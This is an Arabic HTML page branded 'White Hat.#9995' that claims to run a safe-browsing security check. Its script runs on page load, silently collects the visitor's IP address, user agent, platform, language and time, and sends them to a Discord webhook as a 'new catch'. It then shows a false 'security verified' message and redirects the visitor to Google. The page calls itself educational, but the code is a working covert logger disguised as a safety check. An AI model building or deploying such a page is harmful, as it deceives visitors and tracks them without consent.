<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>White Hat.#9995 | مشروع التوعية الأمنية</title>
    <style>
        body {
            background-color: #0a0a0a;
            color: #00ff41;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .container {
            background: rgba(20, 20, 20, 0.9);
            padding: 30px;
            border: 1px solid #00ff41;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
            text-align: center;
            max-width: 500px;
        }
        h1 { font-size: 24px; margin-bottom: 10px; }
        p { color: #888; font-size: 14px; }
        .status { margin-top: 20px; font-weight: bold; color: #fff; }
        .footer {
            margin-top: 30px;
            border-top: 1px solid #333;
            padding-top: 15px;
            font-size: 12px;
            color: #555;
        }
        .dev-name { color: #00ff41; font-weight: bold; }
    </style>
</head>
<body>

<div class="container">
    <h1>نظام التوعية الرقمية - White Hat</h1>
    <p>يتم الآن فحص اتصالك لضمان بيئة تصفح آمنة...</p>
    
    <div class="status" id="loading">جاري معالجة البيانات...</div>

    <div class="footer">
        تم إنشاء هذا النظام بواسطة منظمة <strong>White Hat.#9995</strong> لأغراض تعليمية وتوعوية.<br>
        المطور الرئيسي: <span class="dev-name">Soel</span>
    </div>
</div>

<script>
    // إعدادات الـ Webhook الخاص بك (يمكنك وضع رابط Discord Webhook هنا لاستقبال البيانات)
    const webhookURL = "YOUR_DISCORD_WEBHOOK_URL_HERE";

    async function captureData() {
        try {
            // جلب الـ IP وبيانات الموقع
            const response = await fetch('https://api.ipify.org?format=json');
            const ipData = await response.json();
            const userIP = ipData.ip;

            // جلب تفاصيل إضافية (المتصفح والنظام)
            const details = {
                ip: userIP,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                time: new Date().toLocaleString('ar-EG')
            };

            // إرسال البيانات إلى الـ Webhook (اختياري) أو طباعتها في الكونسول
            console.log("Captured Data:", details);

            if (webhookURL !== "YOUR_DISCORD_WEBHOOK_URL_HERE") {
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**صيد جديد من منظمة White Hat**\n**الـ IP:** ${details.ip}\n**الجهاز:** ${details.platform}\n**الوقت:** ${details.time}`
                    })
                });
            }

            document.getElementById('loading').innerText = "تم التحقق من الأمان بنجاح.";
            
            // تحويل المستخدم بعد 3 ثوانٍ لموقع مفيد (توعوي)
            setTimeout(() => {
                window.location.href = "https://www.google.com"; 
            }, 3000);

        } catch (error) {
            document.getElementById('loading').innerText = "حدث خطأ في الاتصال، حاول لاحقاً.";
        }
    }

    // تشغيل الدالة بمجرد تحميل الصفحة
    window.onload = captureData;
</script>

</body>
</html>
